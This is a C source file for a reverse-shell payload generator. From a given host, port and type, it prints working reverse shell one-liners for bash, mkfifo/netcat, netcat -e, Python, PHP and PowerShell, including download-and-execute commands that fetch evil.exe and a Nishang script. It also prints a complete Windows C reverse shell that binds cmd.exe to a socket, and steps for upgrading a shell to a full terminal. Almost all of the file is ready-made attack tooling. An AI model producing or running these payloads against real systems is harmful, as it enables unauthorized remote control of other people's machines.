#include <stdio.h>
#include <string.h>

int upgrade(char* lhost,char* lport){
    printf("\nUpgrade your shells with\n");
    printf("Python:\n");
    printf("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n");
    printf("Or script:\n");
    printf("script -qc /bin/bash /dev/null\n\n");
    printf("Then CTRL+Z to background the process\n");
    printf("tput lines;tput cols => to get your terminal's ROWS and COLUMNS\n");
    printf("stty raw -echo; fg then press ENTER twice\n");
    printf("stty rows ROWS# cols COLS#\n");
    printf("exportTERM=xterm => to be able to use the clear command\n");
}

int rev_shell(char* lhost,char* lport,char* type) {
    int check;
    check = strcmp(type,"bash");
    if (check == 0){
        printf("Bash TCP:\nbash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'\n\n",lhost,lport);
        printf("Bash UDP:\nbash -c 'bash -i >& /dev/udp/%s/%s 0>&1'\n",lhost,lport);
    }
    check = strcmp(type,"mkfifo");
    if (check == 0){
        printf("Mkfifo:\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n",lhost,lport);
    }
    check = strcmp(type,"nc");
    if (check == 0){
        printf("Netcat:\nLinux:\nnc -e /bin/sh %s %s\n\n",lhost,lport);
        printf("nc -e /bin/bash %s %s\n\n",lhost,lport);
        printf("nc -c bash %s %s\n\n",lhost,lport);
        printf("Windows:\nnc -e cmd.exe %s %s\n\n",lhost,lport);
        printf("nc -e -e powershell.exe %s %s\n",lhost,lport);
    }
    check = strcmp(type,"python");
    if (check == 0){
        printf("Python:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
        printf("s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",lhost,lport);
        printf("subprocess.call([\"/bin/sh\",\"-i\"])'\n\n");
        printf("import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n");
        printf("s.connect((\"%s\",%s))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\n",lhost,lport);
        printf("subprocess.call([\"/bin/sh\",\"-i\"])\n");
    }
    check = strcmp(type,"powershell");
    if (check == 0){
        printf("Powershell:\nEXE:\npowershell \"(new-object System.Net.WebClient).Downloadfile('http://%s/evil.exe','evil.exe')\"\n\n",lhost);
        printf("PS1:\nwget \"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\" -O shell.ps1\n");
        printf("echo \"Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s\" >> shell.ps1\n",lhost,lport);
        printf("\nPayload: powershell \"IEX(New-Object Net.WebClient).downloadString('http://%s/shell.ps1')\"\n",lhost);
    }
    check = strcmp(type,"php");
    if (check == 0){
        printf("PHP:\n<?php\n$sock=fsockopen(\"%s\",%s);\n$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\n?>\n",lhost,lport);
    }
    check = strcmp(type,"windows");
    if (check == 0){
        printf("#include <winsock2.h>\n#include <windows.h>\n#include <ws2tcpip.h>\n#include <stdio.h>\n\n#define DEFAULT_BUFLEN 1024\n\n");
        printf("void RunShell(char* C2Server, int C2Port) {\n\tSOCKET mySocket;\n\tstruct sockaddr_in addr;\n\tWSADATA version;\n\t");
        printf("WSAStartup(MAKEWORD(2,2), &version);\n\tmySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);\n\taddr.sin_family = AF_INET;\n\n\t");
        printf("addr.sin_addr.s_addr = inet_addr(C2Server);\n\taddr.sin_port = htons(C2Port);\n\n\t");
        printf("if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {\n\t\tclosesocket(mySocket);\n\t\t");
        printf("WSACleanup();\n\t} else {\n\t\tprintf(\"Connected to %%s:%%d\\\\n\", C2Server, C2Port);\n\n\t\tchar Process[] = \"cmd.exe\";\n\t\t");
        printf("STARTUPINFO sinfo;\n\t\tPROCESS_INFORMATION pinfo;\n\t\tmemset(&sinfo, 0, sizeof(sinfo));\n\t\tsinfo.cb = sizeof(sinfo);\n\t\t");
        printf("sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);\n\t\tsinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;\n\t\t");
        printf(" CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);\n\n\t\tprintf(\"Process Created %%lu\\\\n\", pinfo.dwProcessId);\n\n\t\t");
        printf("WaitForSingleObject(pinfo.hProcess, INFINITE);\n\t\tCloseHandle(pinfo.hProcess);\n\t\tCloseHandle(pinfo.hThread);\n\t}\n}\n\n");
        printf("int main(int argc, char **argv) {\n\tif (argc == 3) {\n\t\tint port  = atoi(argv[2]);\n\t\tRunShell(argv[1], port);\n\t}\n\telse {\n\t\t");
        printf("char host[] = \"%s\";\n\t\tint port = %s;\n\t\tRunShell(host, port);\n\t}\n\treturn 0;\n}",lhost,lport);
        printf("\n\nCompile with: x86_64-w64-mingw32-gcc revshell.c -o revshell.exe -lwsock32 -lws2_32\n");
    }    
}

int main(int argc, char* argv[]) { 
    int check_types;
    int check_upgrade;
    if (argc == 4){ 
        rev_shell(argv[1],argv[2],argv[3]);
        
    }
    else if (argc == 2){ 
        check_types = strcmp(argv[1],"types");
        check_upgrade = strcmp(argv[1],"upgrades");
        if (check_types == 0){
        printf("Available types:\n");
        printf("bash\nmkfifo\nnc\npowershell\npython\nphp\n");
        }
        else if (check_upgrade == 0){
        upgrade(argv[1],argv[2]);
        }
        else {
        printf("Missing or too many arguments. E.G ./rev_shell 127.0.0.1 1337 bash\n\n");
        printf("To see available types: ./rev_shell types\n");
        printf("To see shell upgrades: ./rev_shell upgrades\n");
        }
    }
    else {
        printf("Missing or too many arguments. E.G ./rev_shell_g 127.0.0.1 1337 bash\n\n");
        printf("To see available types: ./rev_shell_g types\n");
        printf("To see shell upgrades: ./rev_shell upgrades\n");
    }
}
